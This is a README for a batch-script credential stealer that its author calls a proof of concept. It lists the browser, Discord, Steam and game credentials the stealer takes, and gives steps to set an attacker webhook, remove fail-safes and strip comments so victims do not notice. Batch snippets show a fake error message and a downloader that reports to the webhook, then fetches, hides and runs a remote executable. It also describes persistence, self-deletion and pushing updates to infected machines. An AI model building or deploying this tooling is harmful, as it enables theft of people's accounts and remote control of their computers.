❤️

My attempt at making a stealer with batch, it sucks. The script will not be updated anymore. If something, a new one would be made, this time properly. Treat the current BatchStealer as POC, not as a finished product/malware.

# How to use

### ⚠️ Windows 10 build 17063, or later (*cURL* is included)

1. Change the webhook to yours.
2. Remove the fail-safes. ("goto xxx")
3. Run the batch file.

### ❌ Get rid of the comments 📝
* Do a regex search on notepad++, match `^::.*\n` and replace with nothing.

### ⛔ Avoid
* Just changing the webhook and doing nothing else. 
  * If the batch file does nothing the user will open it to see what's wrong.

# Features

### 💉 Steals

*Almost everything is encrypted, I haven't had the patience to do that on a batch file*

 <details>
  <summary>Full system information</summary>
 
   * OS Name & Version
   * Product ID
   * System Manufacturer
   * Processor(s)
   * BIOS Version
   * Time Zone
   * Total Physical Memory
   * Network Card(s)
   * And more...
</details>
<details>
  <summary>Chrome</summary>
 
  * Cookies
  * History
  * Shortcuts
  * Bookmarks
  * Login Data
</details>
<details>
  <summary>Opera</summary>
 
  * Cookies
  * History
  * Shortcuts
  * Bookmarks
  * Login Data
</details>
<details>
  <summary>Vivaldi</summary>
 
  * Cookies
  * History
  * Shortcuts
  * Bookmarks
  * Login Data
</details>
<details>
  <summary>Firefox</summary>
 
  * Logins
  * key3
  * key4
  * Cookies (Plain text!)
</details>
<details>
  <summary>osu!</summary>
 
 * osu!.cfg
</details>
<details>
  <summary>Discord</summary>
 
  * File containing a Token
  * Other various files
</details>
<details>
  <summary>Steam</summary>
 
  * Logged in users (Username, email)
  * Hidden ssfn files
</details>
<details>
  <summary>Minecraft</summary>
 
* Launcher profiles and accounts
</details>
<details>
  <summary>Growtopia</summary>
 
  * Save.dat
</details>

# Other manually addable features

Skip run by Task Scheduler
```batch
if not "%~dp0"=="%vpath%\" (
:: Your code not to get recurred
)
```

Fake error message
```batch
set "vpath="
...

:: FAKE ERROR MESSAGE | REMOVE GOTO IF YOU WANT IT TO DISPLAY
:: ----------------------------------------------------------
goto skipfakeerror
if not "%~dp0"=="%vpath%\" (
start /min /b mshta vbscript:Execute("Msgbox(""Bodytext""+vbCrLf+vbCrLf+""Anotherbody""),16,""Titletext"":window.close")
)
:skipfakeerror

...
```

Download & run payload
```batch
set "vpath="
set "webhook="

cd %vpath%
...

:: PAYLOAD - REMOVE GOTO IF YOU WANT THE SCRIPT TO DOWNLOAD AND RUN A FILE SOMEWHERE
:: ---------------------------------------------------------------------------------
goto skipcustomdownload
	set "customdownloadurl=https://external.ext/file.exe"
        set "customfilename=c.exe"
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Downloading and starting a custom file from\n%customdownloadurl% to %vpath%\%customfilename%```\"}" %webhook%
	IF EXIST "%customfilename%" GOTO waitloop4
	curl --silent -L --fail "%customdownloadurl%" -o "%customfilename%"
	>NUL attrib "%vpath%\%customfilename%" +h
	:waitloop4
	IF EXIST "%customfilename%" GOTO waitloopend4
	timeout /t 5 /nobreak > NUL
	:waitloopend4
	2> NUL start "%customfilename%"
:skipcustomdownload

...
```

# 📑 Other features 

  * Delete itself after execution

  * Add itself to Task Scheduler (CMD window will be invisible when executed)
     * Will make files to `C:\ProgramData` by default. (Hidden)

  * Push updates to infected machine(s) **(Beta, expect bugs and crashes)**
    * Make sure to have a working batch file's source on the link, it will replace everything.
    * Ability to target specific users (Check username)
    
  * Take screenshot


# Todo
* DNS poisoning
  * Simple edit of the hosts file (Would require administrator)
* Other interesting stuff...

# 💡 Support

* If you want to support the project do a pull request.
  * The pull request could be a new steal etc.

# ㊙️ Obfuscation (Read carefully)
  * Recurring does not work with the obfuscation. (Script exits when it reaches it)
  * "Start as administrator" will make a visible error message on the CMD box.

# Thanks
